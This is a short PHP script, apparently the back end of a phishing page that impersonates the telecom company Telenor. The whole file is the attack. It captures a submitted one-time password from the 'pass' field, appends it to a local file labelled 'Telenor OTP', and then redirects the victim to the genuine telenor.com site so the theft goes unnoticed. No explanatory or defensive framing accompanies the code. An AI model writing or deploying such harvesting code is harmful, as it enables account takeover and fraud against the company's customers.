<?php
file_put_contents("otp.txt", "Telenor OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.telenor.com/');
?>
